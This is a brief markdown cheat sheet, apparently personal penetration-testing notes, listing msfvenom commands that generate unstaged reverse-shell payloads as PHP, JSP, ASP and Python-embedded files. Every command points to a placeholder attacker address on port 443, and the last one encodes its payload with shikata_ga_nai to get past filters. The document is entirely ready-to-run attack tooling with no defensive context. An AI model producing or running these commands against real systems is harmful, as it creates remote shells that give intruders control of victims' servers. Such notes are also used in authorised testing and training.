# Msfvenom

## Unstagged

### PHP
```
msfvenom -p php/reverse_php LHOST=x.x.x.x LPORT=443 -f raw > reverse_tcp_443_unstaged.php
```

### JAVA
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f raw > ./shell.jsp
```

### ASP
```
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f asp > reverse_tcp_443_unstaged.asp
```

### For payload inside py file
```
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f py
```
